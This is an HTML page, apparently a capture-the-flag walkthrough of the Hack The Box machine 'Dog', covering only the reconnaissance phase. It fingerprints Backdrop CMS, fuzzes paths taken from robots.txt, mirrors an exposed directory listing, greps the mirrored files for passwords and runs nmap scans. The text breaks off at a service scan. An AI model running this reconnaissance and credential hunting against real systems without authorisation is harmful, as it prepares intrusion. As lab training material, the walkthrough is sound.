@@ -1,0 +1,934 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Home Page</title>
+    <link rel="stylesheet" href="/src/styles.css">
+</head>
+
+<script>
+    document.addEventListener('DOMContentLoaded', function () {
+        const lateralIndex = document.getElementById('lateralIndex');
+        const menuButton = document.querySelector('.menu-button');
+        const dropdownToggles = document.querySelectorAll('.dropdown-toggle');
+        const dropdownMenus = document.querySelectorAll('.dropdown-menu');
+
+        lateralIndex.classList.remove('open'); // Ensures it's hidden on load (off-screen)
+        dropdownMenus.forEach(menu => menu.style.display = 'none'); // Hide dropdowns initially
+
+        menuButton.addEventListener('click', function () {
+            lateralIndex.classList.toggle('open'); // Toggle the 'open' class to slide the menu
+        });
+
+        dropdownToggles.forEach(toggle => {
+            toggle.addEventListener('click', function () {
+                const dropdownMenu = this.nextElementSibling; // Get the next <ul> (the dropdown)
+                if (dropdownMenu.style.display === 'block') {
+                    dropdownMenu.style.display = 'none';
+                } else {
+                    dropdownMenu.style.display = 'block';
+                }
+            });
+        });
+    });
+
+</script>
+
+<body>
+    <!-- Upper Menu -->
+    <div class="upper-menu">
+        <button class="menu-button">></button>
+        <nav>
+            <a href="/">Homepage</a>
+            <a href="/walkthrough/">Walkthroughs</a>
+            <a href="/tools">Tools</a>
+            <a href="/attacks/">Attacks</a>
+            <a href="/protocols">Protocols</a>
+            <a href="/other">Other</a>
+        </nav>
+    </div>
+
+    <!-- Lateral Index -->
+    <div class="lateral-index" id="lateralIndex">
+        <ul id="indexList">
+            <li class="index-item">
+                <span class="dropdown-toggle">Scanning</span>
+                <ul class="dropdown-menu">
+                    <a href="#passive"><li>Passive</li></a>
+                    <a href="#active"><li>Active</li></a>
+                </ul>
+            </li>
+            <li class="index-item">
+                <span class="dropdown-toggle">Attack</span>
+                <ul class="dropdown-menu">
+                    <a href="#user"><li>Gainig access</li></a>
+                    <a href="#privesc"><li>Privilege Scalation</li></a>
+                </ul>
+            </li>
+            <a href="#solutions"><li class="index-item">Solutions</li></a>
+            <a href="#links"><li class="index-item">Links</li></a>
+        </ul>
+    </div>
+    <div class="main-content">
+    <h2>Scanning</h2>
+<h3>Passive</h3>
+<p>First of all, for convenience, I store the target ip on a env variable:</p>
+<pre><code>┌──(oriol㉿zero)-[~]
+└─$ export target=10.10.11.58                                                    
+
+┌──(oriol㉿zero)-[~]
+└─$ echo $target             
+10.10.11.58
+</code></pre>
+<p>First, let's do a ping:</p>
+<pre><code>┌──(oriol㉿zero)-[~]
+└─$ ping -c1 $target
+PING 10.10.11.58 (10.10.11.58) 56(84) bytes of data.
+64 bytes from 10.10.11.58: icmp_seq=1 ttl=63 time=41.8 ms
+
+--- 10.10.11.58 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 41.848/41.848/41.848/0.000 ms
+</code></pre>
+<p>As the TTL is close to 64 we can assume that the target machine is a linux.</p>
+<p>Let's see if it has some web page with <code>wget</code></p>
+<pre><code>┌──(oriol㉿zero)-[~/htb/dog]
+└─$ wget http://$target     
+--2025-03-16 12:28:20--  http://10.10.11.58/
+Connecting to 10.10.11.58:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 13332 (13K) [text/html]
+Saving to: ‘index.html’
+
+index.html                                                 100%[=======================================================================================================================================&gt;]  13.02K  --.-KB/s    in 0.04s   
+
+2025-03-16 12:28:20 (312 KB/s) - ‘index.html’ saved [13332/13332]
+</code></pre>
+<p>Yes, it has one, and looking at the source code I find it interesting that the links on the page use the whole url of the resource, instead of using a relative route. With this, only looking at the code, we already know that the /core/misc directory exists...</p>
+<pre><code>┌──(oriol㉿zero)-[~/htb/dog]
+└─$ cat index.html          
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot; dir=&quot;ltr&quot;&gt;
+    &lt;head&gt;
+    &lt;meta charset=&quot;utf-8&quot; /&gt;
+&lt;link rel=&quot;shortcut icon&quot; href=&quot;http://10.10.11.58/core/misc/favicon.ico&quot; type=&quot;image/vnd.microsoft.icon&quot; /&gt;
+&lt;link rel=&quot;alternate&quot; type=&quot;application/rss+xml&quot; title=&quot;Home page feed&quot; href=&quot;http://10.10.11.58/?q=rss.xml&quot; /&gt;
+&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot; /&gt;
+&lt;meta name=&quot;Generator&quot; content=&quot;Backdrop CMS 1 (https://backdropcms.org)&quot; /&gt;
+    &lt;title&gt;Home | Dog&lt;/title&gt;
+    &lt;link rel=&quot;stylesheet&quot; href=&quot;http://10.10.11.58/files/css/css_X6zzF1Doi3-4xL7pl0sv61SSD5bIKKmx6RMVve62XjQ.css&quot; media=&quot;all&quot; /&gt;
+&lt;link rel=&quot;stylesheet&quot; href=&quot;http://10.10.11.58/files/css/css_xaJU72jAuGdwaW-AT8DAVp4DqDeKRUXAJArM-ju9zyk.css&quot; media=&quot;all&quot; /&gt;
+&lt;link rel=&quot;stylesheet&quot; href=&quot;http://10.10.11.58/files/css/css_8yAeT_ZaBhbUPg9k-ZiV9nHZulifZAb4DJmw9n8AKPs.css&quot; media=&quot;all&quot; /&gt;
+&lt;link rel=&quot;stylesheet&quot; href=&quot;http://10.10.11.58/files/css/css_zqSb9CDhZD129KLKZprUMXWXgRtzeirj-kLRa6cS3Is.css&quot; media=&quot;all&quot; /&gt;
+&lt;link rel=&quot;stylesheet&quot; href=&quot;http://10.10.11.58/files/css/css_snXoHTi_6JPZwKnrUBQdWszwZDzc1v8Cu5HBZTzHKSc.css&quot; media=&quot;all&quot; /&gt;
+&lt;link rel=&quot;stylesheet&quot; href=&quot;http://10.10.11.58/files/css/css_KdLncZZ60zVXTRHdVvCpWhNhgnqjPC4f75swkLplttQ.css&quot; media=&quot;print&quot; /&gt;
+&lt;link rel=&quot;stylesheet&quot; href=&quot;http://10.10.11.58/files/css/css_Wf3ONNSJg6VT6PqfvfGV0GXTENRI0qbfeKA8_jvhHWs.css&quot; media=&quot;screen&quot; /&gt;
+&lt;link rel=&quot;stylesheet&quot; href=&quot;http://10.10.11.58/files/css/css_XiR7G_POCsnr8YgLCoNKdrajweR66gXAXBGjZJf035k.css&quot; media=&quot;screen&quot; /&gt;
+    &lt;script&gt;window.Backdrop = {settings: {&quot;basePath&quot;:&quot;\/&quot;,&quot;pathPrefix&quot;:&quot;&quot;,&quot;drupalCompatibility&quot;:true,&quot;ajaxPageState&quot;:{&quot;theme&quot;:&quot;basis&quot;,&quot;theme_token&quot;:&quot;J0MdrAec4ZUc9cm6CKHZO_aZjKPbewDlze-iLmARzq0&quot;,&quot;css&quot;:{&quot;core\/misc\/normalize.css&quot;:1,&quot;core\/modules\/system\/css\/system.css&quot;:1,&quot;core\/modules\/system\/css\/system.theme.css&quot;:1,&quot;core\/modules\/system\/css\/messages.theme.css&quot;:1,&quot;core\/modules\/layout\/css\/grid-flexbox.css&quot;:1,&quot;core\/modules\/comment\/css\/comment.css&quot;:1,&quot;core\/modules\/date\/css\/date.css&quot;:1,&quot;core\/modules\/field\/css\/field.css&quot;:1,&quot;core\/modules\/search\/search.theme.css&quot;:1,&quot;core\/modules\/user\/css\/user.css&quot;:1,&quot;core\/modules\/views\/css\/views.css&quot;:1,&quot;core\/layouts\/boxton\/boxton.css&quot;:1,&quot;core\/modules\/system\/css\/menu-dropdown.theme.css&quot;:1,&quot;core\/modules\/system\/css\/menu-toggle.theme.css&quot;:1,&quot;core\/themes\/basis\/css\/base.css&quot;:1,&quot;core\/themes\/basis\/css\/layout.css&quot;:1,&quot;core\/themes\/basis\/css\/component\/small-text-components.css&quot;:1,&quot;core\/themes\/basis\/css\/component\/header.css&quot;:1,&quot;core\/themes\/basis\/css\/component\/footer.css&quot;:1,&quot;core\/themes\/basis\/css\/component\/menu-dropdown.css&quot;:1,&quot;core\/themes\/basis\/css\/component\/menu-toggle.css&quot;:1,&quot;core\/themes\/basis\/css\/component\/backdrop-form.css&quot;:1,&quot;core\/themes\/basis\/css\/component\/tabledrag.css&quot;:1,&quot;core\/themes\/basis\/css\/component\/vertical-tabs.css&quot;:1,&quot;core\/themes\/basis\/css\/component\/fieldset.css&quot;:1,&quot;core\/themes\/basis\/css\/component\/dialog.css&quot;:1,&quot;core\/themes\/basis\/css\/component\/progress.css&quot;:1,&quot;core\/themes\/basis\/css\/component\/admin-tabs.css&quot;:1,&quot;core\/themes\/basis\/css\/component\/breadcrumb.css&quot;:1,&quot;core\/themes\/basis\/css\/component\/pager.css&quot;:1,&quot;core\/themes\/basis\/css\/component\/hero.css&quot;:1,&quot;core\/themes\/basis\/css\/component\/cards.css&quot;:1,&quot;core\/themes\/basis\/css\/component\/teasers.css&quot;:1,&quot;core\/themes\/basis\/css\/component\/comment.css&quot;:1,&quot;core\/themes\/basis\/css\/component\/caption.css&quot;:1,&quot;core\/themes\/basis\/css\/skin.css&quot;:1,&quot;core\/themes\/basis\/system.theme.css&quot;:1,&quot;core\/themes\/basis\/menu-dropdown.theme.css&quot;:1,&quot;core\/themes\/basis\/menu-dropdown.theme.breakpoint.css&quot;:1,&quot;core\/themes\/basis\/menu-dropdown.theme.breakpoint-queries.css&quot;:1,&quot;core\/themes\/basis\/css\/print.css&quot;:1,&quot;core\/misc\/opensans\/opensans.css&quot;:1,&quot;core\/misc\/smartmenus\/css\/sm-core-css.css&quot;:1},&quot;js&quot;:{&quot;core\/misc\/jquery.js&quot;:1,&quot;core\/misc\/jquery.once.js&quot;:1,&quot;core\/misc\/backdrop.js&quot;:1,&quot;core\/modules\/layout\/js\/grid-fallback.js&quot;:1,&quot;core\/misc\/smartmenus\/jquery.smartmenus.js&quot;:1,&quot;core\/misc\/smartmenus\/addons\/keyboard\/jquery.smartmenus.keyboard.js&quot;:1,&quot;core\/modules\/system\/js\/menus.js&quot;:1,&quot;core\/themes\/basis\/js\/script.js&quot;:1}}}};&lt;/script&gt;
+&lt;script src=&quot;http://10.10.11.58/files/js/js_Fpmi4jLKypKFwHfXE3Z2dvJEUrvKXwlsPwBNOqC7ppQ.js&quot;&gt;&lt;/script&gt;
+&lt;script src=&quot;http://10.10.11.58/files/js/js_LqF35rklQNC_QUPpVmlzogKA6_iS9Wz6JKAZbCPBiFg.js&quot;&gt;&lt;/script&gt;
+&lt;script src=&quot;http://10.10.11.58/files/js/js_8jBd655zPEzNk-TA__-wte4F0DTtOtizjtk4qjKTPlY.js&quot;&gt;&lt;/script&gt;
+&lt;script src=&quot;http://10.10.11.58/files/js/js__m_E87HVAkZX2YE7oOWSgK-QMfK-PtY209iqcX2wsRE.js&quot;&gt;&lt;/script&gt;
+    &lt;/head&gt;
+    &lt;body class=&quot;page front&quot;&gt;
+    &lt;div class=&quot;layout--boxton layout layout-front&quot;&gt;
+    &lt;div id=&quot;skip-link&quot;&gt;
+    &lt;a href=&quot;#main-content&quot; class=&quot;element-invisible element-focusable&quot;&gt;Skip to main content&lt;/a&gt;
+    &lt;/div&gt;
+</code></pre>
+<p>Seems like a dog blog (lol), and we can also see that uses the "Backdrop CMS" as a CMS, if only we could get the version it would be very useful.</p>
+<p>Let's use whatweb to analyze the headers and see which technologies the web uses, maybe we can get the Backdrop version:</p>
+<pre><code>┌──(oriol㉿zero)-[~/htb/dog]
+└─$ whatweb http://$target        
+http://10.10.11.58 [200 OK] Apache[2.4.41], Content-Language[en], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.58], UncommonHeaders[x-backdrop-cache,x-generator], X-Frame-Options[SAMEORIGIN]
+</code></pre>
+<p>We got the Apache verison (2.4.41), but no luck with the Backdrop version.
+I use <code>curl</code> to see the headers for myself:</p>
+<p>got the curl command from this superuser question:
+- https://superuser.com/questions/1690316/how-can-i-only-show-the-request-header-response-headers-and-output-to-dev-null</p>
+<pre><code>┌──(oriol㉿zero)-[~/htb/dog]
+└─$ curl -sD - -O http://$target
+HTTP/1.1 200 OK
+Date: Thu, 20 Mar 2025 18:34:26 GMT
+Server: Apache/2.4.41 (Ubuntu)
+X-Backdrop-Cache: HIT
+Etag: &quot;1742495564&quot;
+Content-Language: en
+X-Frame-Options: SAMEORIGIN
+X-Generator: Backdrop CMS 1 (https://backdropcms.org)
+Cache-Control: public, max-age=300
+Last-Modified: Thu, 20 Mar 2025 18:32:44 +0000
+Expires: Fri, 16 Jan 2015 07:50:00 GMT
+Vary: Cookie,Accept-Encoding
+Content-Length: 13332
+Content-Range: 0-13331/13332
+Content-Type: text/html; charset=utf-8
+</code></pre>
+<p>No, no verison of Backdrop.
+By looking at the Backdrop official page, we can see that is built with php. 
+- https://backdropcms.org/</p>
+<p>Let's look at the robots.txt file and see if there is something interesting:</p>
+<pre><code>┌──(oriol㉿zero)-[~/htb/dog]
+└─$ wget http://$target/robots.txt
+--2025-03-20 19:41:55--  http://10.10.11.58/robots.txt
+Connecting to 10.10.11.58:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 1198 (1.2K) [text/plain]
+Saving to: ‘robots.txt’
+
+robots.txt                                                 100%[========================================================================================================================================&gt;]   1.17K  --.-KB/s    in 0s      
+
+2025-03-20 19:41:55 (374 MB/s) - ‘robots.txt’ saved [1198/1198]
+
+
+┌──(oriol㉿zero)-[~/htb/dog]
+└─$ cat robots.txt              
+#
+# robots.txt
+#
+# This file is to prevent the crawling and indexing of certain parts
+# of your site by web crawlers and spiders run by sites like Yahoo!
+# and Google. By telling these &quot;robots&quot; where not to go on your site,
+# you save bandwidth and server resources.
+#
+# This file will be ignored unless it is at the root of your host:
+# Used:    http://example.com/robots.txt
+# Ignored: http://example.com/site/robots.txt
+#
+# For more information about the robots.txt standard, see:
+# http://www.robotstxt.org/robotstxt.html
+#
+# For syntax checking, see:
+# http://www.robotstxt.org/checker.html
+
+User-agent: *
+Crawl-delay: 10
+# Directories
+Disallow: /core/
+Disallow: /profiles/
+# Files
+Disallow: /README.md
+Disallow: /web.config
+# Paths (clean URLs)
+Disallow: /admin
+Disallow: /comment/reply
+Disallow: /filter/tips
+Disallow: /node/add
+Disallow: /search
+Disallow: /user/register
+Disallow: /user/password
+Disallow: /user/login
+Disallow: /user/logout
+# Paths (no clean URLs)
+Disallow: /?q=admin
+Disallow: /?q=comment/reply
+Disallow: /?q=filter/tips
+Disallow: /?q=node/add
+Disallow: /?q=search
+Disallow: /?q=user/password
+Disallow: /?q=user/register
+Disallow: /?q=user/login
+Disallow: /?q=user/logout
+</code></pre>
+<p>Let's keep looking, I will dig deeper on this robots.txt file on the active scanning phase.
+Right now we know that the target has http with a dog's blog made with backdrop.</p>
+<p>It has ssh:</p>
+<pre><code>┌──(oriol㉿zero)-[~/htb/dog]
+└─$ ssh root@$target            
+The authenticity of host '10.10.11.58 (10.10.11.58)' can't be established.
+ED25519 key fingerprint is SHA256:M3A+wMdtWP0tBPvp9OcRf6sPPmPmjfgNphodr912r1o.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.11.58' (ED25519) to the list of known hosts.
+root@10.10.11.58's password
+</code></pre>
+<p>Not smb:</p>
+<pre><code>┌──(oriol㉿zero)-[~/htb/dog]
+└─$ smbclient -L $target    
+do_connect: Connection to 10.10.11.58 failed (Error NT_STATUS_CONNECTION_REFUSED)
+</code></pre>
+<p>And not sql running on default port:</p>
+<pre><code>┌──(oriol㉿zero)-[~/htb/dog]
+└─$ mysql -h $target    
+ERROR 2002 (HY000): Can't connect to server on '10.10.11.58' (115)
+</code></pre>
+<h3>Active</h3>
+<p>I will try to check all of that links easly with fuff, first I clean the robots.txt file to create a list, I exlude all the values that contain a ?, which means that is a variable:</p>
+<pre><code>┌──(oriol㉿zero)-[~/htb/dog]
+└─$ cat robots.txt | grep Disallow | grep -v \? | cut -d ' ' -f 2 | tee robots.list
+/core/
+/profiles/
+/README.md
+/web.config
+/admin
+/comment/reply
+/filter/tips
+/node/add
+/search
+/user/register
+/user/password
+/user/login
+/user/logout
+</code></pre>
+<p>And I run it through <code>fuff</code>, with the flag <code>-mc all</code> to see all codes</p>
+<pre><code>┌──(oriol㉿zero)-[~/htb/dog]
+└─$ ffuf -u http://10.10.11.58FUZZ -w ./robots.list -mc all -t 100                 
+
+        /'___\  /'___\           /'___\       
+        /\ \__/ /\ \__/  __  __  /\ \__/       
+        \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+            \ \_\   \ \_\  \ \____/  \ \_\       
+            \/_/    \/_/   \/___/    \/_/       
+
+        v2.1.0-dev
+________________________________________________
+
+    :: Method           : GET
+    :: URL              : http://10.10.11.58FUZZ
+    :: Wordlist         : FUZZ: /home/oriol/htb/dog/robots.list
+    :: Follow redirects : false
+    :: Calibration      : false
+    :: Timeout          : 10
+    :: Threads          : 100
+    :: Matcher          : Response status: all
+________________________________________________
+
+/web.config             [Status: 404, Size: 273, Words: 23, Lines: 10, Duration: 42ms]
+/profiles/              [Status: 404, Size: 273, Words: 23, Lines: 10, Duration: 42ms]
+/comment/reply          [Status: 404, Size: 273, Words: 23, Lines: 10, Duration: 42ms]
+/node/add               [Status: 404, Size: 273, Words: 23, Lines: 10, Duration: 43ms]
+/user/logout            [Status: 404, Size: 273, Words: 23, Lines: 10, Duration: 43ms]
+/filter/tips            [Status: 404, Size: 273, Words: 23, Lines: 10, Duration: 43ms]
+/README.md              [Status: 200, Size: 5285, Words: 596, Lines: 116, Duration: 43ms]
+/search                 [Status: 404, Size: 273, Words: 23, Lines: 10, Duration: 43ms]
+/admin                  [Status: 404, Size: 273, Words: 23, Lines: 10, Duration: 43ms]
+/core/                  [Status: 200, Size: 2912, Words: 185, Lines: 27, Duration: 45ms]
+/user/login             [Status: 404, Size: 273, Words: 23, Lines: 10, Duration: 613ms]
+/user/password          [Status: 404, Size: 273, Words: 23, Lines: 10, Duration: 1637ms]
+/user/register          [Status: 404, Size: 273, Words: 23, Lines: 10, Duration: 1637ms]
+:: Progress: [13/13] :: Job [1/1] :: 8 req/sec :: Duration: [0:00:01] :: Errors: 0 ::
+</code></pre>
+<p>Only the /core/ and the /README.md are accesible.</p>
+<p>The readme is a simple backdrop readme with all the info, except the version...
+The /core page is different, it's an apache index!</p>
+<pre><code>┌──(oriol㉿zero)-[~/htb/dog]
+└─$ wget http://$target/core/ -O core.html
+--2025-03-20 20:06:26--  http://10.10.11.58/core/
+Connecting to 10.10.11.58:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 2912 (2.8K) [text/html]
+Saving to: ‘core.html’
+
+core.html                                                  100%[========================================================================================================================================&gt;]   2.84K  --.-KB/s    in 0s      
+
+2025-03-20 20:06:28 (70.7 MB/s) - ‘core.html’ saved [2912/2912]
+
+
+┌──(oriol㉿zero)-[~/htb/dog]
+└─$ cat core.html
+&lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 3.2 Final//EN&quot;&gt;
+&lt;html&gt;
+    &lt;head&gt;
+    &lt;title&gt;Index of /core&lt;/title&gt;
+    &lt;/head&gt;
+    &lt;body&gt;
+&lt;h1&gt;Index of /core&lt;/h1&gt;
+    &lt;table&gt;
+    &lt;tr&gt;&lt;th valign=&quot;top&quot;&gt;&lt;img src=&quot;/icons/blank.gif&quot; alt=&quot;[ICO]&quot;&gt;&lt;/th&gt;&lt;th&gt;&lt;a href=&quot;?C=N;O=D&quot;&gt;Name&lt;/a&gt;&lt;/th&gt;&lt;th&gt;&lt;a href=&quot;?C=M;O=A&quot;&gt;Last modified&lt;/a&gt;&lt;/th&gt;&lt;th&gt;&lt;a href=&quot;?C=S;O=A&quot;&gt;Size&lt;/a&gt;&lt;/th&gt;&lt;th&gt;&lt;a href=&quot;?C=D;O=A&quot;&gt;Description&lt;/a&gt;&lt;/th&gt;&lt;/tr&gt;
+    &lt;tr&gt;&lt;th colspan=&quot;5&quot;&gt;&lt;hr&gt;&lt;/th&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td valign=&quot;top&quot;&gt;&lt;img src=&quot;/icons/back.gif&quot; alt=&quot;[PARENTDIR]&quot;&gt;&lt;/td&gt;&lt;td&gt;&lt;a href=&quot;/&quot;&gt;Parent Directory&lt;/a&gt;&lt;/td&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;td align=&quot;right&quot;&gt;  - &lt;/td&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td valign=&quot;top&quot;&gt;&lt;img src=&quot;/icons/unknown.gif&quot; alt=&quot;[   ]&quot;&gt;&lt;/td&gt;&lt;td&gt;&lt;a href=&quot;authorize.php&quot;&gt;authorize.php&lt;/a&gt;&lt;/td&gt;&lt;td align=&quot;right&quot;&gt;2024-03-07 17:02  &lt;/td&gt;&lt;td align=&quot;right&quot;&gt;7.1K&lt;/td&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td valign=&quot;top&quot;&gt;&lt;img src=&quot;/icons/unknown.gif&quot; alt=&quot;[   ]&quot;&gt;&lt;/td&gt;&lt;td&gt;&lt;a href=&quot;cron.php&quot;&gt;cron.php&lt;/a&gt;&lt;/td&gt;&lt;td align=&quot;right&quot;&gt;2024-03-07 17:02  &lt;/td&gt;&lt;td align=&quot;right&quot;&gt;1.0K&lt;/td&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td valign=&quot;top&quot;&gt;&lt;img src=&quot;/icons/folder.gif&quot; alt=&quot;[DIR]&quot;&gt;&lt;/td&gt;&lt;td&gt;&lt;a href=&quot;includes/&quot;&gt;includes/&lt;/a&gt;&lt;/td&gt;&lt;td align=&quot;right&quot;&gt;2024-07-08 02:31  &lt;/td&gt;&lt;td align=&quot;right&quot;&gt;  - &lt;/td&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td valign=&quot;top&quot;&gt;&lt;img src=&quot;/icons/unknown.gif&quot; alt=&quot;[   ]&quot;&gt;&lt;/td&gt;&lt;td&gt;&lt;a href=&quot;install.php&quot;&gt;install.php&lt;/a&gt;&lt;/td&gt;&lt;td align=&quot;right&quot;&gt;2024-03-07 17:02  &lt;/td&gt;&lt;td align=&quot;right&quot;&gt;1.3K&lt;/td&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td valign=&quot;top&quot;&gt;&lt;img src=&quot;/icons/folder.gif&quot; alt=&quot;[DIR]&quot;&gt;&lt;/td&gt;&lt;td&gt;&lt;a href=&quot;layouts/&quot;&gt;layouts/&lt;/a&gt;&lt;/td&gt;&lt;td align=&quot;right&quot;&gt;2024-07-08 02:31  &lt;/td&gt;&lt;td align=&quot;right&quot;&gt;  - &lt;/td&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td valign=&quot;top&quot;&gt;&lt;img src=&quot;/icons/folder.gif&quot; alt=&quot;[DIR]&quot;&gt;&lt;/td&gt;&lt;td&gt;&lt;a href=&quot;misc/&quot;&gt;misc/&lt;/a&gt;&lt;/td&gt;&lt;td align=&quot;right&quot;&gt;2024-07-08 02:31  &lt;/td&gt;&lt;td align=&quot;right&quot;&gt;  - &lt;/td&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td valign=&quot;top&quot;&gt;&lt;img src=&quot;/icons/folder.gif&quot; alt=&quot;[DIR]&quot;&gt;&lt;/td&gt;&lt;td&gt;&lt;a href=&quot;modules/&quot;&gt;modules/&lt;/a&gt;&lt;/td&gt;&lt;td align=&quot;right&quot;&gt;2024-07-08 02:31  &lt;/td&gt;&lt;td align=&quot;right&quot;&gt;  - &lt;/td&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td valign=&quot;top&quot;&gt;&lt;img src=&quot;/icons/folder.gif&quot; alt=&quot;[DIR]&quot;&gt;&lt;/td&gt;&lt;td&gt;&lt;a href=&quot;profiles/&quot;&gt;profiles/&lt;/a&gt;&lt;/td&gt;&lt;td align=&quot;right&quot;&gt;2024-07-08 02:31  &lt;/td&gt;&lt;td align=&quot;right&quot;&gt;  - &lt;/td&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td valign=&quot;top&quot;&gt;&lt;img src=&quot;/icons/folder.gif&quot; alt=&quot;[DIR]&quot;&gt;&lt;/td&gt;&lt;td&gt;&lt;a href=&quot;scripts/&quot;&gt;scripts/&lt;/a&gt;&lt;/td&gt;&lt;td align=&quot;right&quot;&gt;2024-07-08 02:31  &lt;/td&gt;&lt;td align=&quot;right&quot;&gt;  - &lt;/td&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td valign=&quot;top&quot;&gt;&lt;img src=&quot;/icons/folder.gif&quot; alt=&quot;[DIR]&quot;&gt;&lt;/td&gt;&lt;td&gt;&lt;a href=&quot;themes/&quot;&gt;themes/&lt;/a&gt;&lt;/td&gt;&lt;td align=&quot;right&quot;&gt;2024-07-08 02:31  &lt;/td&gt;&lt;td align=&quot;right&quot;&gt;  - &lt;/td&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td valign=&quot;top&quot;&gt;&lt;img src=&quot;/icons/unknown.gif&quot; alt=&quot;[   ]&quot;&gt;&lt;/td&gt;&lt;td&gt;&lt;a href=&quot;update.php&quot;&gt;update.php&lt;/a&gt;&lt;/td&gt;&lt;td align=&quot;right&quot;&gt;2024-03-07 17:02  &lt;/td&gt;&lt;td align=&quot;right&quot;&gt; 22K&lt;/td&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;
+    &lt;tr&gt;&lt;th colspan=&quot;5&quot;&gt;&lt;hr&gt;&lt;/th&gt;&lt;/tr&gt;
+&lt;/table&gt;
+&lt;address&gt;Apache/2.4.41 (Ubuntu) Server at 10.10.11.58 Port 80&lt;/address&gt;
+&lt;/body&gt;&lt;/html
+</code></pre>
+<p>The server is misconfigured and we can see all the files inside a directory! This is very useful.</p>
+<p>With <code>wget -rkpN -e robots=off</code> I recursively download all the files on the core directory. It takes a while abut we have all the core directory.</p>
+<pre><code>┌──(oriol㉿zero)-[~/htb/dog/10.10.11.58/core]
+└─$ ls -l
+total 68
+drwxrwxr-x  5 oriol oriol 4096 Mar 20 20:16  includes
+-rw-rw-r--  1 oriol oriol 3140 Mar 20 20:16  index.html
+-rw-rw-r--  1 oriol oriol 3140 Mar 20 20:16 'index.html?C=D;O=A'
+-rw-rw-r--  1 oriol oriol 3140 Mar 20 20:16 'index.html?C=D;O=D'
+-rw-rw-r--  1 oriol oriol 3140 Mar 20 20:16 'index.html?C=M;O=A'
+-rw-rw-r--  1 oriol oriol 3140 Mar 20 20:16 'index.html?C=M;O=D'
+-rw-rw-r--  1 oriol oriol 3140 Mar 20 20:16 'index.html?C=N;O=A'
+-rw-rw-r--  1 oriol oriol 3140 Mar 20 20:16 'index.html?C=N;O=D'
+-rw-rw-r--  1 oriol oriol 3140 Mar 20 20:16 'index.html?C=S;O=A'
+-rw-rw-r--  1 oriol oriol 3140 Mar 20 20:16 'index.html?C=S;O=D'
+-rw-rw-r--  1 oriol oriol 2595 Mar 20 20:16  install.php
+drwxrwxr-x 13 oriol oriol 4096 Mar 20 20:16  layouts
+drwxrwxr-x  7 oriol oriol 4096 Mar 20 20:16  misc
+drwxrwxr-x 43 oriol oriol 4096 Mar 20 20:16  modules
+drwxrwxr-x  5 oriol oriol 4096 Mar 20 20:16  profiles
+drwxrwxr-x  2 oriol oriol 4096 Mar 20 20:16  scripts
+drwxrwxr-x  7 oriol oriol 4096 Mar 20 20:16  themes
+</code></pre>
+<p>With this on-liner we can search all "password" strings in all the human-readable files.</p>
+<pre><code>──(oriol㉿zero)-[~/htb/dog/10.10.11.58/core]
+└─$ find . -type f -exec file {} + | grep -i 'text' | cut -d: -f1 | xargs grep -i 'password'
+./themes/basis/css/skin.css:.password-strength,
+./themes/basis/css/skin.css:.password-match {
+./themes/basis/css/component/backdrop-form.css:.form-type-password label,
+./themes/basis/css/component/backdrop-form.css:.password-strength,
+./themes/basis/css/component/backdrop-form.css:.password-match {
+./themes/basis/css/component/backdrop-form.css:[dir=rtl] .password-strength,
+./themes/basis/css/component/backdrop-form.css:[dir=rtl] .password-match {
+./themes/basis/css/component/backdrop-form.css:.password-strength {
+./themes/seven/css/style.css:.password-strength,
+./themes/seven/css/style.css:.password-match {
+./themes/seven/css/style.css:.password-strength {
+</code></pre>
+<p>I see nothing useful...</p>
+<p>First, I do a quick nmap scan on all the ports, I use the <code>-T4</code> flag to speed things up:</p>
+<pre><code>┌──(oriol㉿zero)-[~/htb/dog]
+└─$ nmap -p- -Pn -T4 $target    
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-20 20:43 CET
+Nmap scan report for 10.10.11.58
+Host is up (0.042s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+</code></pre>
+<p>Only 2 open ports, 22 and 80... Now I will redo the nmap scan but with the flags <code>-sC</code> and <code>-sV</code> to use scripts and version enumerate, this will get me some more info from the webpage.</p>
+<pre><code>┌──(oriol㉿zero)-[~/htb/dog]
+└─$ nmap -sC -sV -p 22,80 -Pn $target
